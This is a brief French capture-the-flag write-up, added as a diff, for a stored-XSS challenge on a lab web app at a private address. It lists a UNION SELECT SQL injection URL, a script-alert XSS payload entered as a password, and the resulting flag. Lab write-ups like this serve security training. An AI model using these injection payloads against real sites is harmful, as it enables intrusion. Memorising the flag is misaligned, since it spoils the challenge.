@@ -1,0 +1,7 @@
+FAILLE XSS-Stored (Feedback)
+
+http://192.168.10.22/?page=feedback
+Login "Hack" (trouvé dans la base de données) => http://192.168.10.22/?page=searchimg&id=5+UNION+SELECT+database(),user()--&Submit=Submit#
+Pour le password, renseigner l'injection : <script>alert('XSS')</script>
+
+FLAG => 0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e
